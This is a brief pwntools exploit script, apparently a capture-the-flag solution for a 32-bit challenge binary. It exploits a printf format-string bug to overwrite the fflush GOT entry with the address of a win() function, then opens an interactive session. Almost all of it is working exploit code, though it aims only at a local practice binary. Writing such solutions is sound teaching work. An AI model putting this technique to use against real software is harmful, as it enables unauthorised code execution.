'''
WRITE-WHAT-WHERE
Flaws: No RELRO, no PIE, Symbols
Security: NX enabled

32-bit has win() func
vuln() has no BOF, instead we take advantage of printf()

WRITE-WHAT-WHERE
for this task, just change fflush to win in the GOT. Boom!
'''
from pwn import *

elf = ELF("./chall_11")
p = process("./chall_11")
l1 = b"Something"
p.sendline(l1)

# 0x80484e6 --> win()
win = 0x80484e6
# win = elf.sym.win
offset = 6
#l2 = b"A"*(offset + 4) + p32(win) + b"junk" + p32(next(elf.search(b"/bin/sh\x00")))
l2 = fmtstr_payload(offset, {elf.got.fflush : win})
print(hex(elf.got.fflush))
print(l2)
null = l2.find(b'\x00')
print(null)
p.sendline(l2)
p.recvuntil(l2[null -3 : null])
p.interactive()
